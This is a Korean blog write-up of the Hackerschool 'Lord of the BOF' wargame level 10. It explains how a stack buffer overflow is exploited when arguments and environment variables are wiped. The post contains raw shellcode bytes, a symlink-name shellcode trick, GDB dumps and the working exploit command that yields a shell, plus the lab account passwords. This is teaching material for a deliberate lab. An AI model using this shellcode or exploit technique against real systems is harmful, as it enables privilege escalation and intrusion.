---
layout: post
title: "[Wargame] 해커스쿨 BoF LEVEL10 (Vampire -> Skeleton) : Argv Hunter"
date: 2015-11-15 12:40
comments: true
categories:  wargame
tags: [bof]
---

- id = vampire 
- pw = music world


<!--more-->

## 1. 문제 : skeleton.c

```c 
skeleton.c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - skeleton
        - argv hunter
*/

#include <stdio.h>
#include <stdlib.h>

extern char **environ;

main(int argc, char *argv[])
{
        char buffer[40];
        int i, saved_argc;

        if(argc < 2){
                printf("argv error\n");
                exit(0);
        }

        // egghunter
        for(i=0; environ[i]; i++)
                memset(environ[i], 0, strlen(environ[i]));

        if(argv[1][47] != '\xbf')
        {
                printf("stack is still your friend.\n");
                exit(0);
        }

        // check the length of argument
        if(strlen(argv[1]) > 48){
                printf("argument is too long!\n");
                exit(0);
        }        
        // argc saver
        saved_argc = argc;

        strcpy(buffer, argv[1]);
        printf("%s\n", buffer);

        // buffer hunter
        memset(buffer, 0, 40);

        // ultra argv hunter!
        for(i=0; i<saved_argc; i++)
                memset(argv[i], 0, strlen(argv[i]));
}   
```

### 1.1 변경된 코드

추가된 제약사항은 `argv[]` 를 모두 0으로 clear 시키는 코드다. 즉, 공격에 `argv[]` 도 이용할 수 없다는 이야기다.

```c
// argc saver
        saved_argc = argc;

        strcpy(buffer, argv[1]);
        printf("%s\n", buffer);

        // buffer hunter
        memset(buffer, 0, 40);

        // ultra argv hunter!
        for(i=0; i<saved_argc; i++)
                memset(argv[i], 0, strlen(argv[i]));
```

### 1.2 GDB 디버깅

```bash
$ gdb ./skeleton2
GNU gdb 19991004
Copyright 1998 Free Software Foundation, Inc.
GDB is free software, covered by the GNU General Public License, and you are
welcome to change it and/or distribute copies of it under certain conditions.
Type "show copying" to see the conditions.
There is absolutely no warranty for GDB.  Type "show warranty" for details.
This GDB was configured as "i386-redhat-linux"...
(gdb)  r `python -c 'print "A"*44 + "\x94\xfb\xf0\xbf"'`  `python -c 'print "B"*100'`
```

#### x/s $esp : 스택을 string 으로 확인

```bash
0xbffffd9a:      ""
0xbffffd9b:      "i686"
0xbffffda0:      "/home/vampire/./skeleton2"     // argv[0]
0xbffffdba:      'A' <repeats 44 times>, "¿¿ð¿"  // argv[1]
0xbffffdeb:      'B' <repeats 100 times>         // argv[2]
0xbffffe50:      ""
0xbffffe51:      ""
```

#### membset() 의 destination address

```bash
edx            0xbffffda0       -1073742432  // argv[0]
edx            0xbffffdba       -1073742406  // argv[1]
edx            0xbffffdeb       -1073742357  // argv[2]
```

#### memset() 하기 이전

![img](https://raw.githubusercontent.com/humb1ec0ding/humb1ec0ding-etc/master/2015/11/stage10-2.png)

#### memset() 한 이후 : argv[] 를 모두 0으로 clear

![img](https://raw.githubusercontent.com/humb1ec0ding/humb1ec0ding-etc/master/2015/11/stage10-1.png)

## 2. 공격 방법 고민

환경변수도 clear 시키고… argv[] 도 모두 clear 시킨다. 그렇다면 shellcode 를 어디에 올려놓을 수 있을까 ???

### Stack을 좀더 찾아보자

혹시나 하는 마음에 stack bottom 까지 찾아보자. 앗… stack bottom 에 뭔가 값이 남아있다. main 함수가 실행되기 이전에 실행파일이름이 스택에 저장이 되는 듯하다. main 함수 실행되기 이전 stack 에 쌓이기 때문에 argc hunter 동작이후에도 남아있는 듯 하다.

```bash
0xbfffffe1:      ""
0xbfffffe2:      "/home/vampire/./skeleton2"
0xbffffffc:      ""

0xbfffffcc:     0x00000000      0x00000000      0x00000000      0x00000000
0xbfffffdc:     0x00000000      0x682f0000      0x2f656d6f      0x706d6176
0xbfffffec:     0x2f657269      0x6b732f2e      0x74656c65      0x00326e6f
0xbffffffc:     0x00000000      Cannot access memory at address 0xc0000000
```

## 3. 공격

### 3.1  공격.. 계속 실패

[LEVEL8](http://humb1ec0ding.github.io/2015/11/13/hackerschool-BoF-stage-8.html)에서 사용한 실행파일이름에 shellcode 를 올려두어야 하므로 `0x2f`=`\` 없는 shellcode 를 이용해야 한다. 아래 shellcoe 를 이용하여 이전과 같은 방식으로 실행을 하는데 계속 fault 가 나는 것이다.

```bash
`python -c 'print "\x90"*50 + "\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"'`
```

`LR`은 `0xbfffffa0` 로 선택.

```bash
0xbffffed0:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffffee0:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffffef0:     0x00000000      0x6f682f00      0x762f656d      0x69706d61
0xbfffff00:     0x902f6572      0x90909090      0x90909090      0x90909090
0xbfffff10:     0x90909090      0x90909090      0x90909090      0x90909090
0xbfffff20:     0x90909090      0x90909090      0x90909090      0x90909090
0xbfffff30:     0x90909090      0x90909090      0x90909090      0x90909090
0xbfffff40:     0x90909090      0x90909090      0x90909090      0x90909090
0xbfffff50:     0x90909090      0x90909090      0x90909090      0x90909090
0xbfffff60:     0x90909090      0x90909090      0x90909090      0x90909090
0xbfffff70:     0x90909090      0x90909090      0x90909090      0x90909090
0xbfffff80:     0x90909090      0x90909090      0x90909090      0x90909090
0xbfffff90:     0x90909090      0x90909090      0x90909090      0x90909090
0xbfffffa0:     0x90909090      0x90909090      0x90909090      0x90909090
0xbfffffb0:     0x90909090      0x90909090      0x90909090      0x90909090
0xbfffffc0:     0x90909090      0x90909090      0xeb909090      0xc9315e11
0xbfffffd0:     0x6c8032b1      0x8001ff0e      0xf67501e9      0xeae805eb
0xbfffffe0:     0x32ffffff      0x306951c1      0x69697430      0x6f6a6330
0xbffffff0:     0x5451e48a      0xb19ae28a      0x0081ce0c      0x00000000
0xc0000000:     Cannot access memory at address 0xc0000000
```

### 3.2 core dump 파일 디버깅

저장된 core dump 를 이용하여 디버깅을 해보자.

```bash
GNU gdb 19991004
Copyright 1998 Free Software Foundation, Inc.
GDB is free software, covered by the GNU General Public License, and you are
welcome to change it and/or distribute copies of it under certain conditions.
Type "show copying" to see the conditions.
There is absolutely no warranty for GDB.  Type "show warranty" for details.
This GDB was configured as "i386-redhat-linux"...

warning: core file may not match specified executable file.
Core was generated by `                                                                              '.
Program terminated with signal 11, Segmentation fault.
Reading symbols from /lib/libc.so.6...done.
Reading symbols from /lib/ld-linux.so.2...done.
#0  0xbfffffd2 in ?? ()
(gdb)
```

shellcode 까지는 jump 를 잘 했는데, Polymorphic Shellcode 를 푸는 과정에서 fault 가 난 것 같다. shellcode 를 바꿔야 할까 ?

```bash
(gdb) info reg
eax            0x2      2
ecx            0x32     50
edx            0x0      0
ebx            0x401081ec       1074823660
esp            0xbffffb90       -1073742960
ebp            0x41414141       1094795585
esi            0xbfffffe3       -1073741853
edi            0xbffffbd4       -1073742892
eip            0xbfffffd2       -1073741870
eflags         0x10246  66118  

0xbfffffc8:     nop
0xbfffffc9:     nop
0xbfffffca:     nop
0xbfffffcb:     jmp    0xbfffffde
0xbfffffcd:     pop    %esi
0xbfffffce:     xor    %ecx,%ecx
0xbfffffd0:     mov    $0x32,%cl
0xbfffffd2:     subb   $0x1,0xffffffff(%esi,%ecx,1)    // Fault !!!
0xbfffffd7:     sub    $0x1,%cl
0xbfffffda:     jne    0xbfffffd2
0xbfffffdc:     jmp    0xbfffffe3
0xbfffffde:     call   0xbfffffcd
0xbfffffe3:     xor    %cl,%al
0xbfffffe5:     push   %ecx
0xbfffffe6:     imul   $0x69697430,(%eax),%esi
0xbfffffec:     xor    %ah,0x6a(%ebx)
0xbfffffef:     outsl  %ds:(%esi),(%dx)
0xbffffff0:     mov    %ah,%ah
0xbffffff2:     push   %ecx
0xbffffff3:     push   %esp
0xbffffff4:     mov    %dl,%ah
0xbffffff6:     lcall  $0x0,$0x81ce0cb1
0xbffffffd:     add    %al,(%eax)
0xbfffffff:     .byte 0x0
0xc0000000:     Cannot access memory at address 0xc0000000
```

## 4. 새로운 shellcode 도전

shellcode 에서 죽는 이유는 명확하게 잘 몰라서 새로운 shellcode를 이용해서 다시 공격을 해보자.

```bash
\x68\xf9\xbf\x0f\x40\x68\xe0\x91\x03\x40\xb8\xe0\x8a\x05\x40\x50\xc3
```


```bash
>  ln -s skeleton `python -c 'print "\x90"*50 + "\x68\xf9\xbf\x0f\x40\x68\xe0\x91\x03\x40\xb8\xe0\x8a\x05\x40\x50\xc3"'`

>  gdb ./`python -c 'print "\x90"*50 + "\x68\xf9\xbf\x0f\x40\x68\xe0\x91\x03\x40\xb8\xe0\x8a\x05\x40\x50\xc3"'`
```

![img](https://raw.githubusercontent.com/humb1ec0ding/humb1ec0ding-etc/master/2015/11/stage10-3.png)
![img](https://raw.githubusercontent.com/humb1ec0ding/humb1ec0ding-etc/master/2015/11/stage10-4.png)

## 5. 공격

`LR` 은 `0xbfffffc0` 으로 선택.

```bash
> ln -s skeleton `python -c 'print "\x90"*50 + "\x68\xf9\xbf\x0f\x40\x68\xe0\x91\x03\x40\xb8\xe0\x8a\x05\x40\x50\xc3"'`

> ./`python -c 'print "\x90"*50 + "\x68\xf9\xbf\x0f\x40\x68\xe0\x91\x03\x40\xb8\xe0\x8a\x05\x40\x50\xc3"'` `python -c 'print "A"*44 + "\xc0\xff\xff\xbf"'`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAÀ  ¿

bash$ id
uid=509(vampire) gid=509(vampire) euid=510(skeleton) egid=510(skeleton) groups=509(vampire)
```

## 6. 다음 단계 정보

```bash
bash$ id
uid=509(vampire) gid=509(vampire) euid=510(skeleton) egid=510(skeleton) groups=509(vampire)

bash$ my-pass
euid = 510
shellcoder
```

## 7. 의문점 : 이전 shellcode 에서 죽는 이유는 ?

이전에 사용한 [Linux/x86 - /bin/sh polymorphic shellcode - 48 bytes shellcode](http://shell-storm.org/shellcode/files/shellcode-491.php) 가 죽는 이유… 나중(?)에 좀더 살펴볼 예정.

```bash
eax            0x2      2
ecx            0x32     50
edx            0x0      0
ebx            0x401081ec       1074823660
esp            0xbffffb90       -1073742960
ebp            0x41414141       1094795585
esi            0xbfffffe3       -1073741853
edi            0xbffffbd4       -1073742892
eip            0xbfffffd2       -1073741870
eflags         0x10246  66118  

0xbfffffca:     nop
0xbfffffcb:     jmp    0xbfffffde
0xbfffffcd:     pop    %esi
0xbfffffce:     xor    %ecx,%ecx
0xbfffffd0:     mov    $0x32,%cl
0xbfffffd2:     subb   $0x1,0xffffffff(%esi,%ecx,1)    // Fault !!!
```